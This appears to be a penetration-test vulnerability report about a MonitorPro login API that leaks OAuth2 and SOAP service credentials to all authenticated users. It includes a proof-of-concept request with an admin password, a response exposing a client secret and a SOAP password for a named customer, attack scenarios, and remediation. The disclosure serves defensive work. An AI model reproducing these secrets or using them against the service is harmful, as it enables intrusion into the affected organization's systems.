# Critical OAuth/SOAP Credential Exposure in Login API Response

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2026-02-17 19:10:29 UTC

## Description

## Summary
The MonitorPro application exposes sensitive OAuth2 and SOAP service credentials to all authenticated users through the login API response. This includes client secrets, service passwords, and authentication configuration that should never be transmitted to client applications.

## Affected Endpoint
- **URL:** https://almaviva.monitorpro.ai/api/users/login
- **Method:** POST
- **Content-Type:** application/json

## Vulnerability Details
When any user (regardless of role) authenticates to the application, the API response includes the complete customer configuration object containing sensitive service credentials:

### Exposed Credentials:
| Credential | Value | Purpose |
|------------|-------|---------|
| passwordSoapService | VlAk13MY9tdBH7t9muhbWwE2jpz3q1 | SOAP Web Service Authentication |
| client_id | external-client-almavivaglobal01 | OAuth2 Client Identifier |
| client_secret | MubXNes8ec1vCfGpJpWrAMVivcXKjV9x | OAuth2 Client Secret |
| userSoapService | ALMAVIVA | SOAP Service Username |
| grant_type | client_credentials | OAuth2 Grant Type |

## Proof of Concept

### Request:
```http
POST /api/users/login HTTP/1.1
Host: almaviva.monitorpro.ai
Content-Type: application/json

{"email":"admin","password":"1futuro2@26"}
```

### Response (truncated):
```json
{
  "user": {
    "_id": "5dcdc96f59f0d52f48207be1",
    "username": "admin",
    "customer": {
      "_id": "5d76977d69b6021ddc86b112",
      "name": "ALMAVIVA",
      "document": 800233052,
      "userSoapService": "ALMAVIVA",
      "passwordSoapService": "VlAk13MY9tdBH7t9muhbWwE2jpz3q1",
      "client_id": "external-client-almavivaglobal01",
      "client_secret": "MubXNes8ec1vCfGpJpWrAMVivcXKjV9x",
      "grant_type": "client_credentials",
      "urldomain": "almaviva.monitorpro.ai"
    }
  },
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

## Affected User Roles
- **Admin Role:** Receives full credentials in login response
- **Operator Role:** Also receives full credentials in login response (tested with jchacon@intrustsecurity.co)
- **All authenticated users** are exposed to these credentials

## Impact Assessment
- **Confidentiality:** CRITICAL - Service credentials exposed to all authenticated users
- **Integrity:** HIGH - Attackers could use credentials to modify data via SOAP/OAuth services
- **Availability:** MEDIUM - Credentials could be used for denial of service attacks

### Attack Scenarios:
1. **Unauthorized SOAP Service Access:** An attacker with any valid user account can extract the SOAP credentials and directly access backend SOAP services, bypassing application-level access controls
2. **OAuth Token Theft:** Using the client_id and client_secret with grant_type=client_credentials, an attacker can obtain OAuth access tokens for protected resources
3. **Privilege Escalation:** Low-privilege operators can use these credentials to access administrative functions through the underlying services
4. **Lateral Movement:** These credentials may be reused across multiple systems, enabling broader network compromise

## CVSS Score
**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L - Score: 9.9 (Critical)**

## Remediation

### Immediate Actions:
1. **Remove sensitive credentials from login API response** - The customer object should not include passwordSoapService, client_id, client_secret, or other service credentials
2. **Rotate all exposed credentials immediately** - All SOAP and OAuth credentials should be considered compromised
3. **Implement server-side credential storage** - Service credentials should only exist on the server side

### Long-term Fixes:
1. Implement proper API response filtering to exclude sensitive fields
2. Use a dedicated secrets management solution (HashiCorp Vault, AWS Secrets Manager)
3. Implement the principle of least privilege for credential access
4. Add API response auditing to detect future credential leaks
5. Separate service authentication from user authentication flows

## References
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- CWE-522: Insufficiently Protected Credentials
- OWASP API Security Top 10 - API3:2023 Broken Object Property Level Authorization
